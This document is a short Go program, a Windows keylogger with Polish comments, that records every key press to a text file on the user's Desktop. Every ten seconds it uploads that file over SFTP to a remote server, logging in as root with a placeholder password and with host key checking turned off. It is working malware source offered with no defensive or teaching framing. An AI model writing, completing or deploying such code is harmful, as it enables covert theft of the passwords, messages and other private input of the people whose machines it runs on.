package main

import (
	"fmt"
	"os"
	"time"
    "golang.org/x/crypto/ssh"
    "github.com/pkg/sftp"
	"github.com/ncmprbll/go-windows-keylogger"
	"io"
    "path/filepath"
    "os/user"
)

var host string = "your_server_here"
var port string = "ssh_port"
var user1 string = "root"
var password string = "your_password_here"  


func hello(client *sftp.Client, conn *ssh.Client) {


	for{
    currentUser, err := user.Current()
    desktopPath := filepath.Join(currentUser.HomeDir, "Desktop")

    localFile, err := os.Open(desktopPath + "\\data.txt")
    
    if err != nil {
        fmt.Println("Błąd otwierania lokalnego pliku:", err)
        return
    }
    defer localFile.Close()

    // Utwórz plik na serwerze
    remoteFilePath := "/home/frog/data/data" + time.Now().UTC().Format("2006-01-02_15-04-05") + ".txt"
    remoteFile, err := client.Create(remoteFilePath)
    if err != nil {
        fmt.Println("Błąd tworzenia pliku na serwerze:", err)
        return
    }
    defer remoteFile.Close()

    // Skopiuj zawartość pliku
    _, err = io.Copy(remoteFile, localFile)
    if err != nil {
        fmt.Println("Błąd kopiowania pliku:", err)
        return
    }

    fmt.Println("Plik został pomyślnie przesłany.")
	time.Sleep(10 * time.Second)

	}
	}


func main(){

    config := &ssh.ClientConfig{
        User: user1,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
    }

    // Nawiązanie połączenia SSH
    conn, err := ssh.Dial("tcp", host+":"+port, config)
    if err != nil {
        fmt.Println("Błąd połączenia SSH:", err)
        return
    }
    defer conn.Close()

    // Utworzenie klienta SFTP
    client, err := sftp.NewClient(conn)
    if err != nil {
        fmt.Println("Błąd tworzenia klienta SFTP:", err)
        return
    }
    defer client.Close()

	go hello(client, conn)
    currentUser, err := user.Current()
    desktopPath := filepath.Join(currentUser.HomeDir, "Desktop")

	f, _ := os.Create(desktopPath + "\\data.txt")

	ln, err := keylogger.NewListener()
	if err != nil {
		fmt.Println("[!]", err)
	}
	
	ln.Add(func(wParam uint64, vkCode uint64){
		if wParam == keylogger.WM_KEYDOWN {
			fmt.Println(string(vkCode))
			_, err := f.WriteString(string(vkCode))
			if err != nil{
				fmt.Println("{!}", err)
				os.Exit(0)
			}
		}

	})



	ln.Listen()
}